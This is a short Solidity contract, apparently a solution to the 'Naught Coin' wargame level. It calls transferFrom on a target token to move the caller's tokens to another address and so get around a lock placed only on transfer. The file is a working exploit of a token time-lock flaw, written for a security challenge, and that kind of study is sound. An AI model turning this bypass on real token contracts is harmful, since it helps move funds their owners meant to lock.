// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaughtCoinAttack {
    function attack(address _target, uint256 _amount) external {
        (bool success, ) = _target.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(2),
                _amount
            )
        );

        require(success, "call failed");
    }
}
